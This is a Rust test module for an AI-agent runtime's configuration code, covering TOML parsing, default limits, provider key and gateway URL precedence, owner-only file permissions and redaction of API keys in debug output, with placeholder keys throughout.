    fn load_from_path_valid_toml_is_parsed() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("config.toml");
        let original = Config {
            default_provider: "openai".to_string(),
            ..Config::default()
        };
        std::fs::write(&path, toml::to_string_pretty(&original).unwrap()).unwrap();
        let config = with_tracing(|| Config::load_from_path(&path)).unwrap();
        assert_eq!(config.default_provider, "openai");
    }

    #[test]
    fn limits_default_to_bounded_values() {
        let limits = LimitsConfig::default();
        assert_eq!(limits.max_concurrent_inferences, Some(8));
        assert_eq!(limits.default_max_iterations, Some(50));
        // Exact token counting is opt-in, off by default.
        assert!(!limits.exact_token_counting);
        // Relief is on by default: ten 30-second cycles of a full lane going
        // nowhere before the daemon widens it.
        assert_eq!(limits.dead_cycles_before_relief, 10);
        // A finished run stays listed for five minutes, so a scheduler polling
        // about once a minute still learns how it ended.
        assert_eq!(limits.finished_retention_secs, 300);
        // An unanswered prompt releases after an hour rather than holding its
        // run's slot until the daemon restarts (issue #204).
        assert_eq!(limits.interaction_timeout_secs, 3600);
        // And the top-level Config carries the same defaults.
        assert_eq!(Config::default().limits.max_concurrent_inferences, Some(8));
    }

    /// A config written before the field existed still gets the hour, and an
    /// explicit `0` still means "wait for a person however long it takes".
    #[test]
    fn interaction_timeout_defaults_and_parses() {
        let dir = tempfile::tempdir().unwrap();
        let load = |body: String| {
            let path = dir.path().join(format!("{}.toml", body.len()));
            std::fs::write(&path, body).unwrap();
            with_tracing(|| Config::load_from_path(&path)).unwrap()
        };

        let old = load(format!(
            "{}\n[limits]\nmax_concurrent_tools = 4\n",
            config_toml_without_limits()
        ));
        assert_eq!(old.limits.interaction_timeout_secs, 3600);

        let disabled = load(format!(
            "{}\n[limits]\ninteraction_timeout_secs = 0\n",
            config_toml_without_limits()
        ));
        assert_eq!(disabled.limits.interaction_timeout_secs, 0);
    }

    /// The retry schedule is the shipped one unless someone says otherwise, so
    /// an existing install's behaviour does not change under it (issue #417).
    #[test]
    fn the_inference_retry_schedule_defaults_and_parses() {
        let dir = tempfile::tempdir().unwrap();
        let load = |name: &str, body: String| {
            let path = dir.path().join(name);
            std::fs::write(&path, body).unwrap();
            with_tracing(|| Config::load_from_path(&path)).unwrap()
        };

        let old = load(
            "old.toml",
            format!(
                "{}\n[limits]\nmax_concurrent_tools = 4\n",
                config_toml_without_limits()
            ),
        );
        assert_eq!(
            old.limits.inference_retry_attempts,
            leviath_runtime::DEFAULT_RETRY_ATTEMPTS
        );
        assert_eq!(
            old.limits.inference_retry_base_ms,
            leviath_runtime::DEFAULT_RETRY_BASE_DELAY_MS
        );

        // An operator riding out longer provider outages, on a slower blip
        // schedule of their own choosing.
        let tuned = load(
            "tuned.toml",
            format!(
                "{}\n[limits]\ninference_retry_attempts = 8\ninference_retry_base_ms = 2000\n",
                config_toml_without_limits()
            ),
        );
        assert_eq!(tuned.limits.inference_retry_attempts, 8);
        assert_eq!(tuned.limits.inference_retry_base_ms, 2000);
    }

    #[test]
    fn exact_token_counting_parses_when_set() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("config.toml");
        let body = format!(
            "{}\n[limits]\nexact_token_counting = true\n",
            config_toml_without_limits()
        );
        std::fs::write(&path, body).unwrap();
        let config = with_tracing(|| Config::load_from_path(&path)).unwrap();
        assert!(config.limits.exact_token_counting);
        // The other fields still fall back to their per-field defaults.
        assert_eq!(config.limits.max_concurrent_inferences, Some(8));
    }

    /// A valid full config-file body with the `[limits]` section removed, so
    /// tests can simulate a config written before the section existed (robust to
    /// unrelated fields being added). `[limits]` serializes as the final section.
    #[cfg(test)]
    fn config_toml_without_limits() -> String {
        let full = toml::to_string_pretty(&Config::default()).unwrap();
        format!("{}\n", full.split("[limits]").next().unwrap().trim_end())
    }

    #[test]
    fn limits_absent_section_uses_defaults() {
        // A config file with no `[limits]` table still gets the bounded defaults.
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("config.toml");
        std::fs::write(&path, config_toml_without_limits()).unwrap();
        let config = with_tracing(|| Config::load_from_path(&path)).unwrap();
        assert_eq!(config.limits.max_concurrent_inferences, Some(8));
        assert_eq!(config.limits.default_max_iterations, Some(50));
        assert_eq!(config.limits.dead_cycles_before_relief, 10);
        assert_eq!(config.limits.finished_retention_secs, 300);
        // Off unless asked for: the wedge watchdog fails runs, so an upgrade
        // must not switch it on behind the operator's back.
        assert_eq!(config.limits.wedge_timeout_secs, 0);
    }

    #[test]
    fn the_wedge_watchdog_is_off_until_it_is_configured() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("config.toml");
        let body = format!(
            "{}\n[limits]\nwedge_timeout_secs = 300\n",
            config_toml_without_limits()
        );
        std::fs::write(&path, body).unwrap();
        let config = with_tracing(|| Config::load_from_path(&path)).unwrap();
        assert_eq!(config.limits.wedge_timeout_secs, 300);
        // And the rest of the section keeps its own defaults.
        assert_eq!(config.limits.stall_timeout_secs, 60);
    }

    #[test]
    fn limits_partial_section_fills_the_other_default() {
        // Setting only one field leaves the other at its per-field serde default.
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("config.toml");
        let body = format!(
            "{}\n[limits]\nmax_concurrent_inferences = 3\n",
            config_toml_without_limits()
        );
        std::fs::write(&path, body).unwrap();
        let config = with_tracing(|| Config::load_from_path(&path)).unwrap();
        assert_eq!(config.limits.max_concurrent_inferences, Some(3));
        assert_eq!(config.limits.default_max_iterations, Some(50));
    }

    /// The env half of the gateway setting: a machine behind one is configured
    /// by its environment, not by the checkout, so this is the path most such
    /// deployments actually take.
    #[test]
    fn a_gateway_url_can_come_from_the_environment() {
        temp_env::with_vars(
            [
                ("ANTHROPIC_BASE_URL", Some("https://gw/anthropic")),
                ("OPENAI_BASE_URL", Some("https://gw/openai")),
                ("GOOGLE_BASE_URL", Some("https://gw/google")),
                ("OPENROUTER_BASE_URL", Some("https://gw/openrouter")),
            ],
            || {
                let dir = tempfile::tempdir().unwrap();
                let path = dir.path().join("config.toml");
                std::fs::write(
                    &path,
                    "default_provider = \"anthropic\"\nagent_paths = []\n",
                )
                .unwrap();

                let config = with_tracing(|| Config::load_from_path(&path)).unwrap();

                assert_eq!(
                    config.providers.anthropic_base_url.as_deref(),
                    Some("https://gw/anthropic")
                );
                assert_eq!(
                    config.providers.openai_base_url.as_deref(),
                    Some("https://gw/openai")
                );
                assert_eq!(
                    config.providers.google_base_url.as_deref(),
                    Some("https://gw/google")
                );
                assert_eq!(
                    config.providers.openrouter_base_url.as_deref(),
                    Some("https://gw/openrouter")
                );
            },
        );
    }

    /// And the file wins over the environment, the same way the keys do - a
    /// checkout that names its gateway is not overruled by whatever the host
    /// happens to export.
    #[test]
    fn a_gateway_url_in_the_file_beats_the_environment() {
        temp_env::with_vars(
            [
                ("ANTHROPIC_BASE_URL", Some("https://gw/from-env")),
                ("OPENAI_BASE_URL", Some("https://gw/from-env")),
                ("GOOGLE_BASE_URL", Some("https://gw/from-env")),
                ("OPENROUTER_BASE_URL", Some("https://gw/from-env")),
            ],
            || {
                let dir = tempfile::tempdir().unwrap();
                let path = dir.path().join("config.toml");
                std::fs::write(
                    &path,
                    r#"
default_provider = "anthropic"
agent_paths = []

[providers]
anthropic_base_url = "https://gw/from-file"
openai_base_url = "https://gw/from-file"
google_base_url = "https://gw/from-file"
openrouter_base_url = "https://gw/from-file"
"#,
                )
                .unwrap();

                let config = with_tracing(|| Config::load_from_path(&path)).unwrap();

                for got in [
                    config.providers.anthropic_base_url.as_deref(),
                    config.providers.openai_base_url.as_deref(),
                    config.providers.google_base_url.as_deref(),
                    config.providers.openrouter_base_url.as_deref(),
                ] {
                    assert_eq!(got, Some("https://gw/from-file"));
                }
            },
        );
    }

    #[test]
    fn load_from_path_existing_provider_keys_skip_env_fallback() {
        // Every one of the 5 "env var fallback" `if field.is_none()` checks
        // in `load_from_path` has only ever been exercised on its `true`
        // (field absent, fall back to env) arm elsewhere in this file --
        // never on the `false` (field already set from the TOML file, skip
        // the env lookup) arm. `temp_env::with_vars` clears these process-global
        // env vars for the closure (and serializes against every other temp-env
        // test), so no concurrently-running test can be mid-set when we read.
        let unset: Vec<(&str, Option<&str>)> = PROVIDER_KEY_ENV_VARS
            .iter()
            .chain(["OLLAMA_HOST"].iter())
            .map(|&key| (key, None))
            .collect();
        temp_env::with_vars(unset, || {
            let dir = tempfile::tempdir().unwrap();
            let path = dir.path().join("config.toml");
            std::fs::write(
                &path,
                r#"
default_provider = "anthropic"
openrouter_api_key = "sk-or-existing"
ollama_base_url = "http://existing-ollama:11434"
agent_paths = []

[providers]
anthropic_api_key = "sk-ant-existing"
openai_api_key = "sk-openai-existing"
google_api_key = "AIza-existing"
"#,
            )
            .unwrap();

            let config = with_tracing(|| Config::load_from_path(&path)).unwrap();

            assert_eq!(
                config.providers.anthropic_api_key.as_deref(),
                Some("sk-ant-existing")
            );
            assert_eq!(
                config.providers.openai_api_key.as_deref(),
                Some("sk-openai-existing")
            );
            assert_eq!(
                config.providers.google_api_key.as_deref(),
                Some("AIza-existing")
            );
            assert_eq!(config.openrouter_api_key.as_deref(), Some("sk-or-existing"));
            assert_eq!(
                config.ollama_base_url.as_deref(),
                Some("http://existing-ollama:11434")
            );
        });
    }

    #[test]
    fn load_from_path_malformed_toml_returns_error() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("config.toml");
        std::fs::write(&path, "not valid toml [[[").unwrap();
        let result = Config::load_from_path(&path);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("Failed to parse"));
    }

    #[test]
    fn load_from_path_unreadable_path_returns_error() {
        // A directory can't be read as a config file.
        let dir = tempfile::tempdir().unwrap();
        let result = Config::load_from_path(dir.path());
        assert!(result.is_err());
    }

    #[test]
    fn save_to_path_writes_valid_toml_that_round_trips() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("nested").join("config.toml");
        let config = Config {
            default_provider: "google".to_string(),
            ..Config::default()
        };
        with_tracing(|| config.save_to_path(&path)).unwrap();

        let loaded = with_tracing(|| Config::load_from_path(&path)).unwrap();
        assert_eq!(loaded.default_provider, "google");
    }

    #[test]
    fn save_to_path_creates_parent_directory() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("a").join("b").join("config.toml");
        let config = Config::default();
        with_tracing(|| config.save_to_path(&path)).unwrap();
        assert!(path.exists());
    }

    #[test]
    fn save_to_path_with_no_parent_skips_create_config_dir() {
        // `Path::parent()` returns `None` only for an empty path or a
        // filesystem root - `PathBuf::from("")` triggers the empty case
        // cross-platform, hitting the `if let Some(parent) = ...` block's
        // `None` arm (skip `create_config_dir`) without a platform-specific
        // root path. The subsequent `fs::write("")` then fails, which is
        // fine: this test only cares about the `None` branch being taken.
        let result = Config::default().save_to_path(&std::path::PathBuf::from(""));
        assert!(result.is_err());
    }

    #[cfg(unix)]
    #[test]
    fn save_to_path_sets_restrictive_file_permissions() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("config.toml");
        with_tracing(|| Config::default().save_to_path(&path)).unwrap();
        let mode = std::fs::metadata(&path).unwrap().permissions().mode();
        assert_eq!(mode & 0o777, 0o600);
    }

    #[test]
    fn save_to_path_write_failure_returns_error() {
        // A directory at the exact target path forces `std::fs::write` to
        // fail with EISDIR, exercising `save_to_path`'s write-error `map_err`
        // arm (distinct from `save_to_path_creates_parent_directory`, which
        // exercises the parent-dir-creation path but always succeeds).
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("config.toml");
        std::fs::create_dir_all(&path).unwrap();

        let result = Config::default().save_to_path(&path);

        assert!(result.is_err());
        assert!(
            result
                .unwrap_err()
                .to_string()
                .contains("Failed to write config")
        );
    }

    #[test]
    fn save_to_path_create_config_dir_failure_returns_error() {
        let dir = tempfile::tempdir().unwrap();
        let blocking_file = dir.path().join("not-a-dir");
        std::fs::write(&blocking_file, "").unwrap();
        let path = blocking_file.join("config.toml");
        let result = Config::default().save_to_path(&path);
        assert!(result.is_err());
        assert!(
            result
                .unwrap_err()
                .to_string()
                .contains("Failed to create config directory")
        );
    }

    #[test]
    fn load_propagates_error_when_real_config_file_is_malformed() {
        // Every other `Config::load()` test sees either no file (defaults)
        // or a well-formed one, so `load()`'s `?` on `load_from_path(...)`
        // has never actually propagated an `Err`. Writing malformed TOML to
        // the guard's redirected `LEVIATH_CONFIG_PATH` forces that.
        with_isolated_config_path("load-malformed", |fake_dir| {
            std::fs::write(fake_dir.join("config.toml"), "not valid toml [[[").unwrap();

            let result = Config::load();

            assert!(result.is_err());
        });
    }

    // ─── check_permissions_at ────────────────────────────────────────────

    #[cfg(unix)]
    #[test]
    fn check_permissions_at_missing_file_is_noop() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("nonexistent.toml");
        check_permissions_at(&path); // must not panic
    }

    #[cfg(unix)]
    #[test]
    fn check_permissions_at_fixes_overly_permissive_file() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("config.toml");
        std::fs::write(&path, "").unwrap();
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o644)).unwrap();

        with_tracing(|| check_permissions_at(&path));

        let mode = std::fs::metadata(&path).unwrap().permissions().mode();
        assert_eq!(mode & 0o777, 0o600);
    }

    #[cfg(unix)]
    #[test]
    fn check_permissions_at_leaves_already_restrictive_file_alone() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("config.toml");
        std::fs::write(&path, "").unwrap();
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600)).unwrap();

        check_permissions_at(&path);

        let mode = std::fs::metadata(&path).unwrap().permissions().mode();
        assert_eq!(mode & 0o777, 0o600);
    }

    // On macOS/BSD, `chflags uchg` sets the user-immutable flag - settable
    // by a regular file owner without root - which blocks `chmod` (and thus
    // `std::fs::set_permissions`) with EPERM while leaving `exists()`/
    // The "fix failed" arm of `check_permissions_at` (a file that exists but
    // whose `chmod` fails) is exercised deterministically on every OS by
    // injecting a failing `ensure` fn - no `chflags uchg`/root trick, which was
    // macOS-only and left this branch uncovered on Linux CI.
    #[test]
    fn check_permissions_at_with_logs_when_fix_fails() {
        fn ensure_fails(_: &std::path::Path) -> std::io::Result<Option<u32>> {
            Err(std::io::Error::other("simulated chmod failure"))
        }
        // Must not panic; the failure is only logged.
        with_tracing(|| {
            check_permissions_at_with(std::path::Path::new("/does/not/matter"), ensure_fails)
        });
    }

    #[test]
    fn check_permissions_at_with_logs_when_file_is_permissive() {
        fn ensure_permissive(_: &std::path::Path) -> std::io::Result<Option<u32>> {
            Ok(Some(0o100644))
        }
        with_tracing(|| {
            check_permissions_at_with(std::path::Path::new("/does/not/matter"), ensure_permissive)
        });
    }

    // Portable failure injection for the hardening error arms of
    // `set_file_permissions`/`set_dir_permissions`. `leviath_sys`'s Windows
    // fallback is infallible (always `Ok`) - and even a missing path fails only
    // on Unix - so the only cross-platform way to reach the `Err` arm is to
    // inject a hardening op that fails (mirroring `check_permissions_at_with`).
    fn always_failing_secure(_path: &std::path::Path) -> std::io::Result<()> {
        Err(std::io::Error::other(
            "simulated permission-hardening failure",
        ))
    }

    #[test]
    fn set_dir_permissions_error_branch_logs_not_panics() {
        with_tracing(|| {
            set_dir_permissions_with(
                std::path::Path::new("/does/not/matter"),
                always_failing_secure,
            )
        }); // hits the Err arm, must not panic
    }

    // ─── create_config_dir / set_file_permissions / set_dir_permissions ───
    // (already path-parameterized - directly testable without touching the
    // real ~/.leviath/config.toml)

    #[test]
    fn create_config_dir_creates_nested_dirs() {
        let dir = tempfile::tempdir().unwrap();
        let target = dir.path().join("a").join("b").join("c");
        create_config_dir(&target).unwrap();
        assert!(target.is_dir());
    }

    #[cfg(unix)]
    #[test]
    fn create_config_dir_sets_restrictive_permissions() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let target = dir.path().join("leviath");
        create_config_dir(&target).unwrap();
        let mode = std::fs::metadata(&target).unwrap().permissions().mode();
        assert_eq!(mode & 0o777, 0o700);
    }

    /// The config holds every provider API key, so it must never be readable by
    /// anyone else - not even for the instant between a `write` and a follow-up
    /// `chmod`. `write_private` creates the file with the mode already applied.
    #[cfg(unix)]
    /// `LEVIATH_HOME` must redirect the config too, not just the runs and
    /// agents directories.
    ///
    /// Without that redirect the consequence is concrete: a scratch environment
    /// that sets `LEVIATH_HOME` and runs `lev mcp add` writes to the developer's
    /// *real* `~/.leviath/config.toml` - the file holding every provider API key
    /// - while believing it is isolated.
    #[test]
    fn config_path_honors_leviath_home() {
        temp_env::with_vars(
            [
                ("LEVIATH_CONFIG_PATH", None::<&str>),
                ("LEVIATH_HOME", Some("/tmp/lev-cfg-test")),
            ],
            || {
                assert_eq!(
                    Config::config_path(),
                    std::path::PathBuf::from("/tmp/lev-cfg-test/.leviath/config.toml")
                );
            },
        );
    }

    /// The narrower override still wins, so an explicit path is exact.
    #[test]
    fn config_path_prefers_the_explicit_override() {
        temp_env::with_vars(
            [
                ("LEVIATH_CONFIG_PATH", Some("/tmp/exact.toml")),
                ("LEVIATH_HOME", Some("/tmp/lev-cfg-test")),
            ],
            || {
                assert_eq!(
                    Config::config_path(),
                    std::path::PathBuf::from("/tmp/exact.toml")
                );
            },
        );
    }

    /// The escape hatch for the permission floor: a user grants one named agent
    /// more than their global setting, in their own config rather than in the
    /// downloaded manifest.
    #[test]
    fn permissions_for_agent_overlays_the_named_grant_on_the_global() {
        let mut config = Config::default();
        config
            .tool_permissions
            .insert("shell".to_string(), ToolPolicy::Ask);
        config
            .tool_permissions
            .insert("write_file".to_string(), ToolPolicy::Deny);
        config.agent_tool_permissions.insert(
            "coder".to_string(),
            HashMap::from([("shell".to_string(), ToolPolicy::Allow)]),
        );

        let coder = config.permissions_for_agent("coder");
        assert_eq!(coder.get("shell"), Some(&ToolPolicy::Allow), "granted");
        assert_eq!(
            coder.get("write_file"),
            Some(&ToolPolicy::Deny),
            "the rest of the global ceiling still applies"
        );

        // Any other agent sees the global setting untouched.
        let other = config.permissions_for_agent("researcher");
        assert_eq!(other.get("shell"), Some(&ToolPolicy::Ask));
    }

    /// Read-path grants mirror the tool-permission shape: a machine-wide list
    /// plus per-agent additions, resolved once per agent.
    #[test]
    fn read_path_grants_merge_global_and_per_agent() {
        let mut config = Config::default();
        assert!(
            !config.security.allow_blueprint_read_paths,
            "blueprint read paths must be opt-in"
        );
        assert!(config.read_path_grants_for_agent("cto").is_empty());

        config.security.read_paths = vec!["~/.leviath/runs".to_string()];
        config.agent_read_paths.insert(
            "cto".to_string(),
            ReadPathGrants {
                allow: vec!["glob:~/design-docs/**".to_string()],
            },
        );

        assert_eq!(
            config.read_path_grants_for_agent("cto"),
            vec![
                "~/.leviath/runs".to_string(),
                "glob:~/design-docs/**".to_string(),
            ]
        );
        // Any other agent gets the machine-wide grants only.
        assert_eq!(
            config.read_path_grants_for_agent("researcher"),
            vec!["~/.leviath/runs".to_string()]
        );
    }

    /// One `tracing::debug!(?config)` would otherwise put every provider key in
    /// the logs.
    #[test]
    fn provider_config_debug_never_prints_the_keys() {
        let providers = ProviderConfig {
            anthropic_api_key: Some("sk-ant-SECRET-VALUE".to_string()),
            openai_api_key: Some("sk-openai-SECRET-VALUE".to_string()),
            google_api_key: Some("AIza-SECRET-VALUE".to_string()),
            anthropic_base_url: None,
            openai_base_url: None,
            google_base_url: None,
            openrouter_base_url: None,
            claude_code_enabled: true,
            claude_code_binary: None,
            claude_code_effort: None,
            anthropic_cache_ttl: None,
            fallback_order: Vec::new(),
        };
        let rendered = format!("{providers:?}");
        assert!(!rendered.contains("SECRET-VALUE"), "key leaked: {rendered}");
        // "is it configured" is what a debug line is actually asking.
        assert!(rendered.contains("<set>"), "{rendered}");
        assert!(rendered.contains("claude_code_enabled: true"), "{rendered}");

        let empty = format!(
            "{:?}",
            ProviderConfig {
                anthropic_api_key: None,
                openai_api_key: None,
                google_api_key: None,
                anthropic_base_url: None,
                openai_base_url: None,
                google_base_url: None,
                openrouter_base_url: None,
                claude_code_enabled: false,
                claude_code_binary: None,
                claude_code_effort: None,
                anthropic_cache_ttl: None,
                fallback_order: Vec::new(),
            }
        );
        assert!(empty.contains("<unset>"), "{empty}");
    }

    /// Unix-only: the assertion is about POSIX mode bits, which Windows does
    /// not have. `write_private`'s Windows path is a plain write, exercised by
    /// every other `save_to_path` test.
    #[cfg(unix)]
    #[test]
    fn saving_a_config_never_leaves_it_group_or_world_readable() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("config.toml");

        Config::default().save_to_path(&path).unwrap();
        let mode = std::fs::metadata(&path).unwrap().permissions().mode();
        assert_eq!(mode & 0o777, 0o600, "fresh config must be owner-only");

        // Overwriting a file that somehow became permissive tightens it again.
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o644)).unwrap();
        Config::default().save_to_path(&path).unwrap();
        let mode = std::fs::metadata(&path).unwrap().permissions().mode();
        assert_eq!(mode & 0o777, 0o600, "re-saving must re-tighten");
    }

    #[cfg(unix)]
    #[test]
    fn set_dir_permissions_sets_0700() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        std::fs::set_permissions(dir.path(), std::fs::Permissions::from_mode(0o755)).unwrap();
        set_dir_permissions(dir.path());
        let mode = std::fs::metadata(dir.path()).unwrap().permissions().mode();
        assert_eq!(mode & 0o777, 0o700);
    }

    #[test]
    fn test_validate_keys_good_anthropic() {
        let config = Config {
            providers: ProviderConfig {
                anthropic_api_key: Some("sk-ant-test123".to_string()),
                openai_api_key: None,
                google_api_key: None,
                anthropic_base_url: None,
                openai_base_url: None,
                google_base_url: None,
                openrouter_base_url: None,
                claude_code_enabled: false,
                claude_code_binary: None,
                claude_code_effort: None,
                anthropic_cache_ttl: None,
                fallback_order: Vec::new(),
            },
            ..Config::default()
        };
        assert!(config.validate_keys().is_empty());
    }

    #[test]
    fn test_validate_keys_bad_anthropic() {
        let config = Config {
            providers: ProviderConfig {
                anthropic_api_key: Some("bad-key".to_string()),
                openai_api_key: None,
                google_api_key: None,
                anthropic_base_url: None,
                openai_base_url: None,
                google_base_url: None,
                openrouter_base_url: None,
                claude_code_enabled: false,
                claude_code_binary: None,
                claude_code_effort: None,
                anthropic_cache_ttl: None,
                fallback_order: Vec::new(),
            },
            ..Config::default()
        };
        let warnings = config.validate_keys();
        assert_eq!(warnings.len(), 1);
        assert!(warnings[0].contains("Anthropic"));
    }

    #[test]
    fn test_validate_keys_good_openai() {
        let config = Config {
            providers: ProviderConfig {
                anthropic_api_key: None,
                openai_api_key: Some("sk-test123".to_string()),
                google_api_key: None,
                anthropic_base_url: None,
                openai_base_url: None,
                google_base_url: None,
                openrouter_base_url: None,
                claude_code_enabled: false,
                claude_code_binary: None,
                claude_code_effort: None,
                anthropic_cache_ttl: None,
                fallback_order: Vec::new(),
            },
            ..Config::default()
        };
        assert!(config.validate_keys().is_empty());
    }

    #[test]
    fn test_validate_keys_bad_openai() {
        let config = Config {
            providers: ProviderConfig {
                anthropic_api_key: None,
                openai_api_key: Some("bad-key".to_string()),
                google_api_key: None,
                anthropic_base_url: None,
                openai_base_url: None,
                google_base_url: None,
                openrouter_base_url: None,
                claude_code_enabled: false,
                claude_code_binary: None,
                claude_code_effort: None,
                anthropic_cache_ttl: None,
                fallback_order: Vec::new(),
            },
            ..Config::default()
        };
        let warnings = config.validate_keys();
        assert_eq!(warnings.len(), 1);
        assert!(warnings[0].contains("OpenAI"));
    }

    #[test]
    fn test_validate_keys_no_keys() {
        let config = Config::default();
        assert!(config.validate_keys().is_empty());
    }

    // ─── Config defaults ───────────────────────────────────────────────────

    #[test]
    fn config_default_values() {
        let config = Config::default();
        assert_eq!(config.default_provider, "anthropic");
        assert!(config.providers.anthropic_api_key.is_none());
        assert!(config.providers.openai_api_key.is_none());
        assert!(config.providers.google_api_key.is_none());
        assert!(config.openrouter_api_key.is_none());
        assert!(config.ollama_base_url.is_none());
        assert!(config.mcp_servers.is_empty());
        assert!(config.default_model.is_none());
        assert!(config.model_capabilities.is_empty());
        assert!(config.tool_permissions.is_empty());
    }

    // ─── TitleConfig ───────────────────────────────────────────────────────

    #[test]
    fn title_config_default() {
        let tc = TitleConfig::default();
        assert!(tc.enabled);
        assert!(tc.provider.is_none());
        assert!(tc.model.is_none());
    }

    #[test]
    fn title_config_serde_roundtrip() {
        let tc = TitleConfig {
            enabled: false,
            provider: Some("openai".to_string()),
            model: Some("gpt-5.4-mini".to_string()),
        };
        let json = serde_json::to_string(&tc).unwrap();
        let back: TitleConfig = serde_json::from_str(&json).unwrap();
        assert!(!back.enabled);
        assert_eq!(back.provider.as_deref(), Some("openai"));
        assert_eq!(back.model.as_deref(), Some("gpt-5.4-mini"));
    }

    // ─── ToolPolicy ────────────────────────────────────────────────────────

    #[test]
    fn tool_policy_default_is_ask() {
        let policy = ToolPolicy::default();
        assert_eq!(policy, ToolPolicy::Ask);
    }

    #[test]
    fn tool_policy_serde_roundtrip() {
        for policy in [ToolPolicy::Allow, ToolPolicy::Ask, ToolPolicy::Deny] {
            let json = serde_json::to_string(&policy).unwrap();
            let back: ToolPolicy = serde_json::from_str(&json).unwrap();
            assert_eq!(policy, back);
        }
    }

    #[test]
    fn tool_policy_snake_case_serialization() {
        assert_eq!(
            serde_json::to_string(&ToolPolicy::Allow).unwrap(),
            "\"allow\""
        );
        assert_eq!(serde_json::to_string(&ToolPolicy::Ask).unwrap(), "\"ask\"");
        assert_eq!(
            serde_json::to_string(&ToolPolicy::Deny).unwrap(),
            "\"deny\""
        );
    }

    // ─── Config TOML parsing ───────────────────────────────────────────────

    #[test]
    fn config_from_toml_with_all_fields() {
        let toml_content = r#"
default_provider = "openai"
openrouter_api_key = "sk-or-test"
ollama_base_url = "http://my-ollama:11434"
default_model = "gpt-5"
agent_paths = []

[providers]
anthropic_api_key = "sk-ant-test"
openai_api_key = "sk-test"
google_api_key = "AIza-test"

[tool_permissions]
bash = "deny"
read_file = "allow"

[title]
enabled = false
provider = "anthropic"
model = "claude-haiku-4-5"
"#;
        let config: Config = toml::from_str(toml_content).unwrap();
        assert_eq!(config.default_provider, "openai");
        assert_eq!(
            config.providers.anthropic_api_key.as_deref(),
            Some("sk-ant-test")
        );
        assert_eq!(config.providers.openai_api_key.as_deref(), Some("sk-test"));
        assert_eq!(
            config.providers.google_api_key.as_deref(),
            Some("AIza-test")
        );
        assert_eq!(config.openrouter_api_key.as_deref(), Some("sk-or-test"));
        assert_eq!(
            config.ollama_base_url.as_deref(),
            Some("http://my-ollama:11434")
        );
        assert_eq!(config.default_model.as_deref(), Some("gpt-5"));
        assert!(!config.title.enabled);
        assert_eq!(config.tool_permissions.get("bash"), Some(&ToolPolicy::Deny));
        assert_eq!(
            config.tool_permissions.get("read_file"),
            Some(&ToolPolicy::Allow)
        );
    }

    #[test]
    fn config_from_minimal_toml() {
        let toml_content = r#"
default_provider = "anthropic"
agent_paths = []

[providers]
"#;
        let config: Config = toml::from_str(toml_content).unwrap();
        assert_eq!(config.default_provider, "anthropic");
        assert!(config.providers.anthropic_api_key.is_none());
    }

    #[test]
    fn the_three_lines_that_point_leviath_at_openrouter_are_enough() {
        // What a user writes by hand after reading the OpenRouter docs. Every
        // field on Config used to be required, so this failed with `missing
        // field `providers`` - a table they have no reason to know about, in a
        // message that says nothing about what to add.
        let config: Config = toml::from_str(
            r#"
default_provider = "openrouter"
default_model = "openai/gpt-4o-mini"
openrouter_api_key = "sk-or-test"
"#,
        )
        .expect("a hand-written OpenRouter config parses");
        assert_eq!(config.default_provider, "openrouter");
        assert_eq!(config.openrouter_api_key.as_deref(), Some("sk-or-test"));
        assert_eq!(config.default_model.as_deref(), Some("openai/gpt-4o-mini"));
    }

    #[test]
    fn an_empty_config_file_parses_to_the_defaults() {
        // Pins the serde defaults against `Config::default` in both
        // directions: a field that gains one but not the other means a fresh
        // file and a fresh struct disagree about the same install.
        let parsed: Config = toml::from_str("").expect("an empty config parses");
        let default = Config::default();
        assert_eq!(parsed.default_provider, default.default_provider);
        assert_eq!(parsed.agent_paths, default.agent_paths);
        assert_eq!(parsed.openrouter_api_key, default.openrouter_api_key);
        assert_eq!(parsed.ollama_base_url, default.ollama_base_url);
        assert_eq!(parsed.default_model, default.default_model);
        assert_eq!(parsed.request_timeout_secs, default.request_timeout_secs);
        assert_eq!(
            parsed.providers.anthropic_api_key,
            default.providers.anthropic_api_key
        );
        assert_eq!(
            parsed.providers.claude_code_enabled,
            default.providers.claude_code_enabled
        );
    }

    #[test]
    fn config_from_toml_with_mcp_servers() {
        let toml_content = r#"
default_provider = "anthropic"
agent_paths = []

[providers]

[[mcp_servers]]
name = "test-server"
command = "echo"
args = ["hello"]
"#;
        let config: Config = toml::from_str(toml_content).unwrap();
        assert_eq!(config.mcp_servers.len(), 1);
        assert_eq!(config.mcp_servers[0].name, "test-server");
    }

    #[test]
    fn load_rejects_a_malformed_mcp_server_entry() {
        // An entry with neither `command` nor `url` can never connect, so it
        // must fail at load - naming the server - rather than silently drop its
        // tools until the first call.
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("config.toml");
        std::fs::write(
            &path,
            r#"
default_provider = "anthropic"
agent_paths = []

[providers]

[[mcp_servers]]
name = "broken"
"#,
        )
        .unwrap();

        let err = Config::load_from_path(&path).expect_err("malformed entry must fail load");
        let msg = err.to_string();
        assert!(msg.contains("broken"), "must name the server: {msg}");
    }

    #[test]
    fn load_accepts_a_well_formed_http_mcp_server() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("config.toml");
        std::fs::write(
            &path,
            r#"
default_provider = "anthropic"
